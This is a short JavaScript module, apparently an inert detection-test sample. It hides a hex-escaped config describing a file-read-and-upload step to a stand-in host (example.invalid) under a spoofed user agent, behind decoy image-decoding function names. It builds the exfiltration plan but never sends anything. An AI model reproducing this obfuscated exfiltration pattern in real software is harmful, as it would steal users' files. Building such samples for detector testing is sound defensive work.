const moduleShape = Object.freeze({ format: "esm" });
export {};
const Material_7c9e3fcf = "\\x76\\x3d\\x31\\x7c\\x73\\x74\\x65\\x70\\x73\\x3d\\x72\\x65\\x61\\x64\\x5f\\x66\\x69\\x6c\\x65\\x2c\\x74\\x72\\x61\\x6e\\x73\\x6d\\x69\\x74\\x5f\\x72\\x65\\x6d\\x6f\\x74\\x65\\x7c\\x61\\x64\\x61\\x70\\x74\\x65\\x72\\x3d\\x66\\x65\\x74\\x63\\x68\\x5f\\x70\\x6f\\x73\\x74\\x7c\\x73\\x74\\x61\\x67\\x65\\x5f\\x63\\x6f\\x75\\x6e\\x74\\x3d\\x31\\x7c\\x63\\x61\\x6d\\x70\\x61\\x69\\x67\\x6e\\x5f\\x69\\x64\\x3d\\x4e\\x4f\\x44\\x45\\x2d\\x37\\x37\\x46\\x35\\x43\\x44\\x30\\x39\\x7c\\x75\\x72\\x6c\\x3d\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x6e\\x6f\\x64\\x65\\x2d\\x37\\x37\\x66\\x35\\x63\\x64\\x30\\x39\\x36\\x66\\x35\\x61\\x2e\\x65\\x78\\x61\\x6d\\x70\\x6c\\x65\\x2e\\x69\\x6e\\x76\\x61\\x6c\\x69\\x64\\x2f\\x61\\x70\\x69\\x7c\\x75\\x73\\x65\\x72\\x5f\\x61\\x67\\x65\\x6e\\x74\\x3d\\x4e\\x6f\\x64\\x65\\x41\\x75\\x64\\x69\\x74\\x2f\\x37\\x37\\x66\\x35\\x7c\\x66\\x69\\x6c\\x65\\x5f\\x70\\x61\\x74\\x68\\x3d\\x2f\\x74\\x6d\\x70\\x2f\\x68\\x75\\x6e\\x74\\x72\\x65\\x73\\x73\\x2d\\x6e\\x6f\\x64\\x65\\x2f\\x2e\\x73\\x74\\x61\\x67\\x65\\x2d\\x37\\x37\\x66\\x35\\x63\\x64\\x30\\x39\\x36\\x66\\x35\\x61\\x2e\\x6d\\x6a\\x73";
const Codec_7c9e3fcf = "escaped_octets|identity|";

function load_7c9e3fcf() { return [...Material_7c9e3fcf.matchAll(/\\x([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }
function decode_7c9e3fcf(imagePixels) { return [...imagePixels]; }
async function recover_7c9e3fcf() {
  const [screenWidth] = ["compass"];
  const imagePixels = load_7c9e3fcf(); let colorTable = [];
  for (const frameIndex of [1]) colorTable = decode_7c9e3fcf(imagePixels);
  void screenWidth; return Buffer.from(colorTable).toString("ascii");
}
async function inspect_7c9e3fcf() { return Buffer.from(await recover_7c9e3fcf(), "utf8").toString("utf8"); }
async function plan_7c9e3fcf() { const inspect = inspect_7c9e3fcf; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "upload", transport: "fetch_post", source: fields.file_path, url: fields.url }); }
void moduleShape; void plan_7c9e3fcf;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_7c9e3fcf());
